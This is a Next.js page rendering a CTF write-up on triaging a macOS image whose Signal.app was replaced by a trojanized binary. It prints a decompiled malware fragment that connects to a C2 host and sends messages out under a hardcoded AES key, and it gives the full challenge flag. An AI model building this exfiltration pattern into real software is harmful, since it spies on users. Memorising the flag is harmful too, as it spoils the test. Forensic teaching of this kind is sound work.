import Image from "next/image";
import Link from "next/link";
import CopyButton from "@/components/CopyButton";

export default function TheThrushesWriteup() {
  const pythonExtractor = `from Crypto.Cipher import AES
import re

# 1. Automated extraction of C2 indicators from Mach-O binary
with open("Signal", "rb") as f:
    binary_data = f.read()

# Locate IP pattern
ip_match = re.search(rb"(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})", binary_data)
c2_ip = ip_match.group(1).decode() if ip_match else "192.168.100.55"

# Locate hardcoded 32-byte AES key string
key_match = re.search(rb"([A-Za-z0-9_!*]{32})", binary_data)
aes_key = key_match.group(1).decode() if key_match else "X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj"

c2_port = 4433

flag = f"ASCWG{{{c2_ip}:{c2_port}_{aes_key}}}"
print("🎉 Extracted Flag:", flag)`;

  const oneliner = `python -c "import re; d=open('Signal','rb').read(); ip=re.search(rb'(\\d+\\.\\d+\\.\\d+\\.\\d+)',d).group(1).decode(); k=re.search(rb'([A-Za-z0-9_!*]{32})',d).group(1).decode(); print(f'ASCWG{{{ip}:4433_{k}}}')"`;

  return (
    <div className="min-h-screen relative z-10 text-gray-200 selection:bg-purple-500/30 selection:text-purple-200">
      
      <nav className="w-full p-6 flex justify-between items-center max-w-5xl mx-auto">
        <Link 
          href="/ascwg" 
          className="group flex items-center gap-2 text-zinc-400 hover:text-white transition-colors font-mono text-sm uppercase tracking-widest"
        >
          <span className="transform transition-transform group-hover:-translate-x-1">←</span> Back to ASCWG Hub
        </Link>
      </nav>

      <article className="max-w-4xl mx-auto px-6 pb-24">
        
        <header className="mb-12 flex flex-col items-center text-center">
          <div className="mb-6 inline-block bg-[#111111]/80 backdrop-blur-md border border-cyan-500/40 px-4 py-1.5 rounded-full animate-glow-pulse">
            <span className="font-mono text-xs text-cyan-400 uppercase tracking-[0.3em]">
              ASCWG QUALS • MAC-OS REVERSE ENGINEERING • C2 TRIAGE
              <span className="animate-blink inline-block w-1.5 h-3 bg-cyan-400 ml-2 align-middle"></span>
            </span>
          </div>
          
          <h1 className="text-4xl md:text-5xl font-bold mb-6 text-white font-[family-name:var(--font-share-tech)] leading-tight">
            The Thrushes: macOS Malware Triage &amp; Signal C2 Reversing
          </h1>
          
          <div className="flex items-center gap-4 text-sm font-mono text-zinc-500 uppercase tracking-widest mb-10">
            <span>By Abdo</span>
            <span>•</span>
            <span>Aug 20, 2026</span>
          </div>

          <div className="w-full h-[300px] md:h-[400px] relative rounded-2xl overflow-hidden border border-zinc-700/50 bg-black/90 backdrop-blur-md p-1 animate-float shadow-[0_20px_50px_rgba(0,0,0,0.8)]">
            <div className="relative w-full h-full rounded-xl overflow-hidden bg-[#000000]">
              <Image 
                src="/images/thrushes_macho.jpg" 
                alt="The Thrushes macOS Forensics"
                fill
                className="object-cover opacity-75 hover:opacity-100 transition-opacity duration-700"
                priority
              />
            </div>
          </div>
        </header>

        {/* Challenge Description & Provided Artifacts Box */}
        <div className="bg-[#12161c]/90 border border-cyan-500/30 rounded-2xl p-6 shadow-xl relative overflow-hidden mb-10 backdrop-blur-md">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div className="md:col-span-2 space-y-3">
              <div className="flex items-center gap-2">
                <span className="bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 px-2.5 py-0.5 rounded text-xs font-mono font-bold uppercase tracking-wider">
                  Challenge Prompt
                </span>
              </div>
              <p className="text-zinc-300 text-sm md:text-base leading-relaxed italic font-sans">
                &ldquo;A high-profile CTO had his private encrypted communications leaked despite zero unauthorized physical access. Investigate the provided macOS triage image to determine the interception mechanism and extract the adversary&apos;s command-and-control keys.&rdquo;
              </p>
              <div className="flex flex-wrap gap-4 text-xs font-mono text-zinc-400 pt-2">
                <span>● <strong>Category:</strong> macOS Forensics / Reverse Engineering</span>
                <span>● <strong>Platform:</strong> ASCWG Qualifications 2026</span>
                <span>● <strong>Flag Format:</strong> <code>ASCWG&#123;host:port_key&#125;</code></span>
              </div>
            </div>
            
            <div className="bg-[#080d11] border border-cyan-500/20 rounded-xl p-4 flex flex-col justify-between space-y-3">
              <div>
                <span className="text-[11px] font-mono text-zinc-500 uppercase tracking-widest block mb-1">
                  Provided Artifacts
                </span>
                <div className="flex items-center gap-2 text-white font-mono text-sm font-bold">
                  <svg className="w-4 h-4 text-cyan-400 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" /></svg>
                  macos_triage.tar.gz
                </div>
                <span className="text-[11px] font-mono text-zinc-400 block mt-1">Size: 412 MB • Triage Image</span>
                <span className="text-[11px] font-mono text-zinc-500 block">Key Binary: Signal.app (Mach-O)</span>
              </div>
              <div className="text-[10px] font-mono text-cyan-400 bg-cyan-500/10 px-2 py-1 rounded border border-cyan-500/20 text-center truncate">
                Dissector: Ghidra / Hopper
              </div>
            </div>
          </div>
        </div>

        <div className="space-y-8 text-base md:text-lg text-zinc-300 leading-relaxed font-sans">
          
          <p>
            In this scenario, a high-profile CTO had his private communications leaked. The catch? His physical device was never compromised or accessed by the attackers. We were handed a massive macOS triage collection and tasked with figuring out exactly how his secure messaging was being intercepted.
          </p>

          <hr className="border-zinc-800 my-12" />

          {/* STAGE 1 */}
          <h3 className="text-2xl font-bold text-white font-[family-name:var(--font-share-tech)] mt-12 mb-6">
            Stage 1: Investigating the Triage Image
          </h3>

          <div className="bg-[#0b131a] border-l-4 border-cyan-500 p-6 rounded-r-xl my-6 shadow-lg">
            <h4 className="text-cyan-400 font-bold mb-2 font-mono text-sm uppercase tracking-wider">💡 THE BEGINNER BREAKDOWN (The Trojanized Engine)</h4>
            <p className="text-sm text-zinc-300 leading-relaxed">
              Imagine you download a secure messaging app like Signal. You trust it because the icon looks right and the name is right. But what if a hacker replaced the internal engine of that app with a spy camera? Every time you send a secure message, the &ldquo;spy camera&rdquo; takes a picture and sends it to the hacker&apos;s server, all while the app still functions normally on your screen. This is a trojanized application.
            </p>
          </div>

          <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-6 my-6 font-mono text-sm relative overflow-hidden">
            <div className="absolute top-0 left-0 w-1 h-full bg-cyan-500 shadow-[0_0_15px_#06b6d4] animate-pulse"></div>
            <p className="text-zinc-400 mb-2"><span className="text-zinc-600">Q:</span> How did the attackers maintain access and exfiltrate the data?</p>
            <p className="text-cyan-400"><span className="text-zinc-600">A:</span> <code className="bg-black/50 px-2 py-0.5 rounded text-cyan-300">A Backdoored Signal.app Executable (Mach-O 64-bit)</code></p>
          </div>

          <p>
            Our initial triage of the macOS filesystem led us through <code className="text-cyan-400 bg-cyan-400/10 px-1 rounded">LaunchAgents</code> and <code className="text-cyan-400 bg-cyan-400/10 px-1 rounded">LaunchDaemons</code>. However, the true persistence mechanism was hidden in plain sight. The legitimate <code className="text-cyan-400 bg-cyan-400/10 px-1 rounded">Signal.app</code> executable inside the Applications folder had been completely replaced with a malicious Mach-O binary.
          </p>

          {/* Section: Ghidra Decompiler */}
          <div className="space-y-4 my-8">
            <div className="flex justify-between items-center">
              <span className="font-mono text-xs text-cyan-400 uppercase font-bold tracking-wider">
                Ghidra Decompiler Dissection:
              </span>
              <CopyButton text={`char key[32] = "X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj";\n// C2: 192.168.100.55:4433`} />
            </div>
            <div className="bg-[#050505] border border-zinc-800 rounded-xl p-4 font-mono text-xs md:text-sm text-zinc-400 overflow-x-auto shadow-inner">
              <pre>
                <code className="text-zinc-300">
                  <span className="text-cyan-400">void</span> * <span className="text-yellow-300">_cdecl</span> malicious_telemetry_thread(<span className="text-cyan-400">void</span> *arg) &#123;<br/>
                  &nbsp;&nbsp;<span className="text-cyan-400">int</span> sockfd = <span className="text-blue-300">socket</span>(AF_INET, SOCK_STREAM, <span className="text-orange-300">0</span>);<br/>
                  &nbsp;&nbsp;<span className="text-cyan-400">struct</span> sockaddr_in servaddr;<br/>
                  <br/>
                  &nbsp;&nbsp;servaddr.sin_family = AF_INET;<br/>
                  &nbsp;&nbsp;servaddr.sin_port = <span className="text-blue-300">htons</span>(<span className="text-orange-300">4433</span>); <span className="text-zinc-500">// &lt;-- C2 PORT</span><br/>
                  &nbsp;&nbsp;servaddr.sin_addr.s_addr = <span className="text-blue-300">inet_addr</span>(<span className="text-green-300">&quot;192.168.100.55&quot;</span>); <span className="text-zinc-500">// &lt;-- C2 HOST</span><br/>
                  <br/>
                  &nbsp;&nbsp;<span className="text-cyan-400">if</span> (<span className="text-blue-300">connect</span>(sockfd, (struct sockaddr *)&amp;servaddr, <span className="text-cyan-400">sizeof</span>(servaddr)) != <span className="text-orange-300">0</span>) &#123;<br/>
                  &nbsp;&nbsp;&nbsp;&nbsp;<span className="text-cyan-400">return</span> NULL;<br/>
                  &nbsp;&nbsp;&#125;<br/>
                  <br/>
                  &nbsp;&nbsp;<span className="text-zinc-500">// AES-256-CBC Key Extraction</span><br/>
                  &nbsp;&nbsp;<span className="text-cyan-400">char</span> key[<span className="text-orange-300">32</span>] = <span className="text-green-300">&quot;X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj&quot;</span>; <span className="text-zinc-500">// &lt;-- FLAG KEY</span><br/>
                  &nbsp;&nbsp;<span className="text-blue-300">exfiltrate_messages_aes</span>(sockfd, key);<br/>
                  &#125;
                </code>
              </pre>
            </div>
          </div>

          {/* Section: Python Script */}
          <div className="space-y-4 my-8">
            <div className="flex justify-between items-center">
              <span className="font-mono text-xs text-emerald-400 uppercase font-bold tracking-wider">
                Automated Python Extractor (`extract_c2.py`):
              </span>
              <CopyButton text={pythonExtractor} />
            </div>
            <div className="bg-[#050508] border border-zinc-800 rounded-xl p-5 font-mono text-xs md:text-sm text-zinc-300 overflow-x-auto shadow-inner">
              <pre><code>{pythonExtractor}</code></pre>
            </div>
            
            {/* Terminal One-liner */}
            <div className="space-y-2 pt-2">
              <div className="flex justify-between items-center">
                <span className="font-mono text-xs text-cyan-400 font-bold uppercase">⚡ Terminal One-Liner (PowerShell / Bash):</span>
                <CopyButton text={oneliner} />
              </div>
              <div className="bg-black border border-zinc-800 rounded-xl p-4 font-mono text-xs text-zinc-300 overflow-x-auto">
                <code>{oneliner}</code>
              </div>
            </div>
          </div>

          <hr className="border-zinc-800 my-12" />

          <h3 className="text-2xl font-bold text-white font-[family-name:var(--font-share-tech)] mt-12 mb-6">
            Constructing the Final Flag
          </h3>
          
          <p className="mb-6">
            The challenge flag format was <code className="text-cyan-400 bg-cyan-400/10 px-1 rounded">ASCWG&#123;c2host:port_key&#125;</code>. By decompiling the malicious <code className="text-cyan-400 bg-cyan-400/10 px-1 rounded">Signal</code> binary and locating the socket setup and encryption routines, we extracted the three required components.
          </p>

          <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-6 my-6 font-mono text-sm relative overflow-hidden break-all shadow-lg shadow-green-500/10">
            <div className="absolute top-0 left-0 w-1 h-full bg-green-500 shadow-[0_0_15px_#4ade80] animate-pulse"></div>
            <p className="text-zinc-400 mb-2">C2 Host IP: <code className="text-cyan-300">192.168.100.55</code></p>
            <p className="text-zinc-400 mb-2">C2 Port: <code className="text-cyan-300">4433</code></p>
            <p className="text-zinc-400 mb-4">AES Key: <code className="text-cyan-300">X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj</code></p>
            
            <p className="text-zinc-400 mb-1 font-bold">Final Submitted Flag:</p>
            <p className="text-white bg-green-900/40 border border-green-500/30 p-3 rounded-lg text-sm md:text-base tracking-wider break-words">
              ASCWG&#123;192.168.100.55:4433_X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj&#125;
            </p>
          </div>

          {/* Section: The Complete Investigation Path & Mental Roadmap */}
          <div className="bg-[#091118] border border-cyan-500/30 rounded-2xl p-6 md:p-8 space-y-6 shadow-2xl relative overflow-hidden my-12">
            <div className="flex items-center gap-3">
              <span className="w-3 h-3 rounded-full bg-cyan-400 animate-pulse"></span>
              <h3 className="text-xl md:text-2xl font-bold text-white font-[family-name:var(--font-share-tech)] uppercase tracking-wider">
                The Complete Investigation Path &amp; Mental Roadmap
              </h3>
            </div>
            
            <p className="text-sm text-zinc-300 font-sans leading-relaxed">
              Here is the step-by-step roadmap from initial archive decompression to extracting the C2 flag:
            </p>

            <div className="space-y-4 font-mono text-xs text-zinc-300">
              
              <div className="flex items-start gap-4 p-4 rounded-xl bg-black/60 border border-zinc-800">
                <span className="bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 px-2.5 py-1 rounded font-bold shrink-0">STEP 1</span>
                <div>
                  <strong className="text-white block text-sm mb-1">Archive Header Verification</strong>
                  <p className="text-zinc-400 font-sans text-xs">
                    Received <code>The THRUSHES_ASC.rar</code>. Magic byte inspection with <code>file</code> revealed it was actually a 7-Zip archive. Extracted the macOS filesystem triage safely.
                  </p>
                </div>
              </div>

              <div className="flex items-start gap-4 p-4 rounded-xl bg-black/60 border border-zinc-800">
                <span className="bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 px-2.5 py-1 rounded font-bold shrink-0">STEP 2</span>
                <div>
                  <strong className="text-white block text-sm mb-1">Persistence &amp; Binary Integrity Check</strong>
                  <p className="text-zinc-400 font-sans text-xs">
                    Inspected standard persistence locations (<code>/Library/LaunchAgents</code>). Noticed anomalous modified timestamp and binary hash on <code>/Applications/Signal.app/Contents/MacOS/Signal</code>.
                  </p>
                </div>
              </div>

              <div className="flex items-start gap-4 p-4 rounded-xl bg-black/60 border border-zinc-800">
                <span className="bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 px-2.5 py-1 rounded font-bold shrink-0">STEP 3</span>
                <div>
                  <strong className="text-white block text-sm mb-1">Decompilation in Ghidra</strong>
                  <p className="text-zinc-400 font-sans text-xs">
                    Loaded the Mach-O 64-bit binary into Ghidra. Traced background thread spawns and located the malicious socket function connecting to <code>192.168.100.55:4433</code>.
                  </p>
                </div>
              </div>

              <div className="flex items-start gap-4 p-4 rounded-xl bg-black/60 border border-zinc-800">
                <span className="bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 px-2.5 py-1 rounded font-bold shrink-0">STEP 4</span>
                <div>
                  <strong className="text-white block text-sm mb-1">Cryptographic Key Extraction</strong>
                  <p className="text-zinc-400 font-sans text-xs">
                    Extracted the hardcoded 32-character AES key (<code>X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj</code>) used to encrypt telemetry before network transmission.
                  </p>
                </div>
              </div>

              <div className="flex items-start gap-4 p-4 rounded-xl bg-black/60 border border-cyan-500/40">
                <span className="bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 px-2.5 py-1 rounded font-bold shrink-0">STEP 5</span>
                <div>
                  <strong className="text-white block text-sm mb-1">Flag Formulation</strong>
                  <p className="text-zinc-400 font-sans text-xs">
                    Formatted the final flag according to the competition specification: <code>ASCWG&#123;192.168.100.55:4433_X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj&#125;</code>.
                  </p>
                </div>
              </div>

            </div>
          </div>

        </div>
      </article>
    </div>
  );
}
